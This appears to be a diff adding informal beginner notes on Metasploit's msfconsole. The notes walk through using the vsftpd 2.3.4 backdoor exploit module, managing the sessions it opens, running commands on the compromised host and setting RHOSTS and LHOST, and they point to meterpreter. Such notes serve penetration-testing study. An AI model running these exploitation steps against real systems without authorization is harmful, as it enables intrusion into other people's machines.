@@ -1,0 +1,39 @@
+msfconsole - SART METASPLOIT (DO SOME RESEARCH TO GET TO KNOW THE USSAGE LASHON!)
+
+INSIDE: msf:
+ search --- searching inside the software
+
+EXAMPLE USAGE FOR FTP:
+
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(vsftpd_234_backdoor) > show targets
+    ...targets...
+msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >
+msf exploit(vsftpd_234_backdoor) > show options
+    ...show and set options...
+
+msf exploit(vsftpd_234_backdoor) > exploit (exploit -j -z) --- running the exploit in the background; and solve conectivity problems if there are some!
+
+sessions -l --- shows active sessions!
+sessions 1 --- start the session and the connection (1 is the ID got from command 
+"sessions -l" SO BE AWARE!)
+
+background --- the session is not closed but it is in the background
+
+exit --- to loose the connection!
+
+uname -a --- shows who we are but not like "whoami" but a machine version and type and stuff...!
+
+
+TIPS:
+after using every module first use "show options" and get familiar with the options to configure inside!
+example:
+
+We need to know what is RHOSTS: 
+RHOSTS stands for remote hosts!
+LHOST stands for local host! (our IP address in this case (Metasploit))
+so make the needed research!
+
+
+LAST:
+learn about "meterpreter" --- (ADVANCED SHELL)!!!
